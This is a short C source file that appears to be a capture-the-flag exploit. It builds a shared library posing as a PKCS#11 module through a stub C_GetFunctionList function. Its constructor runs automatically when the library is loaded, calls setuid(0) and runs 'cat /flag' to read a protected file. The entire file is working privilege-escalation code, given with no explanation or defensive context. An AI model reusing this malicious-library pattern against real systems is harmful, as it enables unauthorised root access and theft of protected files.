#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) onload() {
    printf("Current effective UID: %d\n", geteuid());
    printf("Current real UID: %d\n", getuid());
    setuid(0);
    printf("Current real UID after setuid: %d\n", getuid());
    system("cat /flag");
}

int C_GetFunctionList() {
    return 1;
}
